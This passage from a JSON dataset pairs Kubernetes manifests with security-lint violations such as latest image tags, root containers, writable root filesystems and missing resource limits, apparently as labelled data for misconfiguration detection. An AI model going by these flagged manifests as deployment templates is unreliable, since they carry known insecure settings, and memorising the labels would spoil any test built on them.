fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fdb-workloade\" has memory limit 0"
  },
  {
    "id": "00992",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fdb-workloadf\" has memory limit 0"
  },
  {
    "id": "00993",
    "manifest_path": "data/manifests/the_stack_sample/sample_0242.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-scheduler-operator-container\" does not have a read-only root file system"
  },
  {
    "id": "00994",
    "manifest_path": "data/manifests/the_stack_sample/sample_0242.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-scheduler-operator-container\" is not set to runAsNonRoot"
  },
  {
    "id": "00995",
    "manifest_path": "data/manifests/the_stack_sample/sample_0242.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-scheduler-operator-container\" has cpu request 0"
  },
  {
    "id": "00996",
    "manifest_path": "data/manifests/the_stack_sample/sample_0242.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-kube-scheduler-operator\n  name: openshift-kube-scheduler-operator\n  labels:\n    app: openshift-kube-scheduler-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: openshift-kube-scheduler-operator\n  template:\n    metadata:\n      name: openshift-kube-scheduler-operator\n      labels:\n        app: openshift-kube-scheduler-operator\n    spec:\n      serviceAccountName: openshift-kube-scheduler-operator\n      containers:\n      - name: kube-scheduler-operator-container\n        image: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        imagePullPolicy: Always\n        command:\n        - cluster-kube-scheduler-operator\n        - operator\n        args:\n        - --config=/var/run/configmaps/config/config.yaml\n        - -v=4\n        resources:\n          requests:\n            memory: 50Mi\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        env:\n        - name: IMAGE\n          value: quay.io/openshift/origin-hyperkube:v4.0\n        - name: OPERATOR_IMAGE\n          value: docker.io/openshift/origin-cluster-kube-scheduler-operator:v4.0\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          name: openshift-kube-scheduler-operator-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-scheduler-operator-container\" has memory limit 0"
  },
  {
    "id": "00997",
    "manifest_path": "data/manifests/the_stack_sample/sample_0243.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00998",
    "manifest_path": "data/manifests/the_stack_sample/sample_0243.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "00999",
    "manifest_path": "data/manifests/the_stack_sample/sample_0243.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01000",
    "manifest_path": "data/manifests/the_stack_sample/sample_0243.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01001",
    "manifest_path": "data/manifests/the_stack_sample/sample_0243.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-622\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01002",
    "manifest_path": "data/manifests/the_stack_sample/sample_0244.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"matkuber-b39d\" is using an invalid container image, \"matacr.azurecr.io/matkuber\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01003",
    "manifest_path": "data/manifests/the_stack_sample/sample_0244.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"matkuber-b39d\" does not have a read-only root file system"
  },
  {
    "id": "01004",
    "manifest_path": "data/manifests/the_stack_sample/sample_0244.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"matkuber-b39d\" is not set to runAsNonRoot"
  },
  {
    "id": "01005",
    "manifest_path": "data/manifests/the_stack_sample/sample_0244.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"matkuber-b39d\" has cpu request 0"
  },
  {
    "id": "01006",
    "manifest_path": "data/manifests/the_stack_sample/sample_0244.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"matkuber-b39d\" has memory limit 0"
  },
  {
    "id": "01007",
    "manifest_path": "data/manifests/the_stack_sample/sample_0250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: dataservice-forecast-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: dataservice-forecast-job\n          image: gwdowner/dataservice:latest\n          command:\n          - npm\n          - run\n          - batchjob:forecast\n          imagePullPolicy: Always\n          envFrom:\n          - secretRef:\n              name: data-service\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dataservice-forecast-job\" is using an invalid container image, \"gwdowner/dataservice:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01008",
    "manifest_path": "data/manifests/the_stack_sample/sample_0250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: dataservice-forecast-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: dataservice-forecast-job\n          image: gwdowner/dataservice:latest\n          command:\n          - npm\n          - run\n          - batchjob:forecast\n          imagePullPolicy: Always\n          envFrom:\n          - secretRef:\n              name: data-service\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dataservice-forecast-job\" does not have a read-only root file system"
  },
  {
    "id": "01009",
    "manifest_path": "data/manifests/the_stack_sample/sample_0250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: dataservice-forecast-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: dataservice-forecast-job\n          image: gwdowner/dataservice:latest\n          command:\n          - npm\n          - run\n          - batchjob:forecast\n          imagePullPolicy: Always\n          envFrom:\n          - secretRef:\n              name: data-service\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dataservice-forecast-job\" is not set to runAsNonRoot"
  },
  {
    "id": "01010",
    "manifest_path": "data/manifests/the_stack_sample/sample_0250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: dataservice-forecast-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: dataservice-forecast-job\n          image: gwdowner/dataservice:latest\n          command:\n          - npm\n          - run\n          - batchjob:forecast\n          imagePullPolicy: Always\n          envFrom:\n          - secretRef:\n              name: data-service\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dataservice-forecast-job\" has cpu request 0"
  },
  {
    "id": "01011",
    "manifest_path": "data/manifests/the_stack_sample/sample_0250.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: dataservice-forecast-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: dataservice-forecast-job\n          image: gwdowner/dataservice:latest\n          command:\n          - npm\n          - run\n          - batchjob:forecast\n          imagePullPolicy: Always\n          envFrom:\n          - secretRef:\n              name: data-service\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dataservice-forecast-job\" has memory limit 0"
  },
  {
    "id": "01012",
    "manifest_path": "data/manifests/the_stack_sample/sample_0255.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jupyter-web-app\" does not have a read-only root file system"
  },
  {
    "id": "01013",
    "manifest_path": "data/manifests/the_stack_sample/sample_0255.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jupyter-web-app\" is not set to runAsNonRoot"
  },
  {
    "id": "01014",
    "manifest_path": "data/manifests/the_stack_sample/sample_0255.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jupyter-web-app\" has cpu request 0"
  },
  {
    "id": "01015",
    "manifest_path": "data/manifests/the_stack_sample/sample_0255.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jupyter-web-app\" has memory limit 0"
  },
  {
    "id": "01016",
    "manifest_path": "data/manifests/the_stack_sample/sample_0259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:latest\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"job-trigger-controller-manager\" is using an invalid container image, \"job-trigger-controller-manager:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01017",
    "manifest_path": "data/manifests/the_stack_sample/sample_0259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:latest\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job-trigger-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "01018",
    "manifest_path": "data/manifests/the_stack_sample/sample_0259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:latest\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job-trigger-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "01019",
    "manifest_path": "data/manifests/the_stack_sample/sample_0259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:latest\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job-trigger-controller-manager\" has cpu request 0"
  },
  {
    "id": "01020",
    "manifest_path": "data/manifests/the_stack_sample/sample_0259.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:latest\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job-trigger-controller-manager\" has memory limit 0"
  },
  {
    "id": "01021",
    "manifest_path": "data/manifests/the_stack_sample/sample_0260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "01022",
    "manifest_path": "data/manifests/the_stack_sample/sample_0260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "01023",
    "manifest_path": "data/manifests/the_stack_sample/sample_0260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "01024",
    "manifest_path": "data/manifests/the_stack_sample/sample_0260.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "01025",
    "manifest_path": "data/manifests/the_stack_sample/sample_0261.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"heapster\" does not have a read-only root file system"
  },
  {
    "id": "01026",
    "manifest_path": "data/manifests/the_stack_sample/sample_0261.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n",
    "policy_id": "run-as-non-root",
